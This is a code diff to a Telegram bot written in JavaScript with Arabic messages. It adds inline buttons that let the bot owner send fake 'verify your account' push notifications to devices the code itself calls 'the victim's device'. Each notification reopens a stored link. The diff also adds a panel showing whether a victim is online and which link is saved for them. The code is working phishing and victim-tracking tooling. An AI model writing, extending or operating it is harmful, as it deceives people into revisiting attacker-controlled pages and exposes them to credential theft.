@@ -973,6 +973,41 @@ bot.on('callback_query', async (q) => {
   if (data.startsWith("reply:"))
     return bot.sendMessage(chatId,`${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`,{reply_markup:JSON.stringify({force_reply:true})});
 
+  // ── Pull notification (inline button) ─────────────────────────────────────
+  if (data.startsWith("pull:")) {
+    if (q.from.id !== BOT_OWNER) return bot.answerCallbackQuery(q.id, { text:"⛔ غير مصرح", show_alert:true });
+    const _pid = data.slice(5);
+    if (!pushSubs[_pid]) return bot.answerCallbackQuery(q.id, { text:"❌ الجهاز غير مسجّل", show_alert:true });
+    const _purl = pushSubs[_pid].purl || null;
+    if (!_purl) return bot.answerCallbackQuery(q.id, { text:"⚠️ لا يوجد رابط محفوظ — يجب أن يفتح الرابط أولاً", show_alert:true });
+    const _r = await sendPushToDevice(_pid, "🔔 تحقق من حسابك", "اضغط هنا للتحقق من حسابك", _purl);
+    if (_r === "sse")   return bot.answerCallbackQuery(q.id, { text:"✅ تم — الجهاز متصل، سيظهر الإشعار فوراً", show_alert:true });
+    if (_r === "vapid") return bot.answerCallbackQuery(q.id, { text:"✅ تم — إشعار خلفي، عند النقر يفتح الرابط", show_alert:true });
+    return bot.answerCallbackQuery(q.id, { text:"📴 الجهاز غير متصل حالياً", show_alert:true });
+  }
+
+  // ── Push device info (inline button) ──────────────────────────────────────
+  if (data.startsWith("pushinfo:")) {
+    if (q.from.id !== BOT_OWNER) return;
+    const _pid = data.slice(9);
+    const _e   = pushSubs[_pid];
+    if (!_e) return bot.answerCallbackQuery(q.id, { text:"❌ غير موجود", show_alert:true });
+    const _online  = !!sseClients[_pid];
+    const _hasSub  = !!(_e.subscription);
+    const _purl    = _e.purl ? _e.purl.slice(0,60)+"…" : "غير محفوظ";
+    return bot.sendMessage(chatId,
+      `📋 معلومات الجهاز\n🆔 \`${_pid}\`\n\n` +
+      `🟢 متصل الآن: ${_online ? "نعم" : "لا"}\n` +
+      `🔔 إشعار خلفي: ${_hasSub ? "✅ مسجّل" : "❌ غير مسجّل"}\n` +
+      `🔗 الرابط: ${_purl}`,
+      { parse_mode:"Markdown",
+        reply_markup: JSON.stringify({ inline_keyboard: [
+          [{ text:"📲 سحب الجهاز", callback_data:`pull:${_pid}` }, { text:"📩 إرسال رسالة", switch_inline_query_current_chat:`/push ${_pid} ` }]
+        ] })
+      }
+    );
+  }
+
   // ── Premium info (all users) ───────────────────────────────────────────────
   if (data === "pinfo") {
     const hasPrem = isPremium(chatId);
@@ -1676,8 +1711,12 @@ app.get("/push-stream", (req, res) => {
     saveJSON(PUSH_FILE, pushSubs);
     backupFileToGH("./push_subs.json", "_data/push_subs.json");
     const tid = parseInt(uid, 36);
-    notify(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n✅ إرسال رسالة:\n/push ${pid} النص\n\n📲 سحب الجهاز (يفتح الرابط مجدداً):\n/pull ${pid}`);
-    if (tid !== BOT_OWNER) notify(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 PID: ${pid}\n(Creator: ${tid})`);
+    const _pushKb = { reply_markup: JSON.stringify({ inline_keyboard: [
+      [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", switch_inline_query_current_chat: `/push ${pid} ` }],
+      [{ text: "📋 معلومات الجهاز", callback_data: `pushinfo:${pid}` }]
+    ] }) };
+    bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
+    if (tid !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 \`${pid}\`\n(Creator: ${tid})`, { parse_mode:"Markdown", ..._pushKb });
   } else {
     // Update purl if changed
     if (purl && pushSubs[pid].purl !== purl) {
